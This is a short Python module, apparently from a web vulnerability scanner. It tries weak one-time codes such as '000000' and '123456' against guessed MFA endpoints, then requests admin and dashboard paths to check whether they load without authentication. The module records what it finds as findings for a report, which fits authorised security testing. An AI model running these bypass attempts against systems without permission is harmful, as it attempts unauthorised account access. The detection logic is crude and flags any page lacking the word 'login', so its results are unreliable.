"""MFA bypass techniques."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse

MFA_BYPASS_PATHS = ["/mfa", "/2fa", "/verify", "/otp", "/totp", "/mfa/verify", "/auth/mfa"]

def scan_base(base_url):
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    root = "{}://{}".format(parsed.scheme, parsed.netloc)
    for path in MFA_BYPASS_PATHS:
        url = root + path
        # try OTP bypass with common values
        for otp in ["000000", "123456", "111111", "000000", "999999"]:
            resp = post(url, data={"otp": otp, "code": otp, "token": otp, "mfa_code": otp})
            if resp.status != 0 and resp.status in (200, 302):
                text = (resp.text or "").lower()
                if "success" in text or "welcome" in text or "dashboard" in text or resp.status == 302:
                    findings.append(Finding(
                        id="mfa-bypass-{}-{}".format(otp, hash(url) & 0xffff),
                        target=parsed.netloc,
                        type="MFA Bypass (weak OTP)",
                        severity="critical",
                        url=url,
                        parameter="otp",
                        payload=otp,
                        evidence="MFA accepted weak OTP (status {})".format(resp.status),
                        response_snippet=resp.snippet(200),
                        confidence=0.5,
                    ))
                    break
        # MFA skip: access protected resource directly
        for protected in ["/dashboard", "/admin", "/account", "/profile", "/home"]:
            r = get(root + protected)
            if r.status == 200 and "login" not in (r.text or "").lower():
                findings.append(Finding(
                    id="mfa-skip-{}-{}".format(protected, hash(url) & 0xffff),
                    target=parsed.netloc,
                    type="MFA Skip (direct access)",
                    severity="high",
                    url=root + protected,
                    parameter="path",
                    payload=protected,
                    evidence="Protected page accessible without MFA",
                    response_snippet=r.snippet(200),
                    confidence=0.5,
                ))
    log_event(parsed.netloc, "mfa_bypass_scan", {"base": base_url, "findings": len(findings)})
    return findings

scan_url = scan_base
